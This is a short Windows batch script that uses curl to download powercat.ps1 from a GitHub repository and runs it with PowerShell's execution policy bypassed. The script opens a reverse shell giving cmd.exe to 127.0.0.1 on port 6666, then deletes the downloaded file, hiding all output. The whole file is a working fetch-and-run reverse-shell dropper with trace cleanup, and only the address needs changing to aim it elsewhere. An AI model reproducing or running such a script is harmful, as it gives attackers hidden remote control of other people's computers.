@echo off
color 4
curl -L -o powercat.ps1 https://github.com/SomeCoolFilesIMake/HAHAHHA/raw/main/powercat.ps1 >nul
powershell.exe -ExecutionPolicy Bypass -File powercat.ps1 -c 127.0.0.1 -p 6666 -e cmd.exe >nul
del "powercat.ps1" >nul